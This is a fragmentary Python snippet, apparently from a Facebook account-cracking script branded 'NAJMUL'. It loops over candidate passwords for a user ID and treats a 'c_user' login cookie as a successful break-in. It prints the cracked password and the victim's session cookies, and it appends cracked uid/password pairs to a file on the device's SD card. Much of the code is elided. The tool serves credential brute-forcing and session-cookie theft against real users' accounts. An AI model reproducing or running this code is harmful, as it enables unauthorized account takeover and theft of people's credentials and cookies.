...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mNAJMUL\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[T4ST-OK💛] {uid} • {ps}")
                print(f" \n COOKIES [💉]  : {coki}")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f" \n COOKIES [💉]  : {coki}")
                open('/sdcard/NAJMUL-CP.txt', 'a').write( uid+' • '+ps+' \n')
                cps.append(uid)
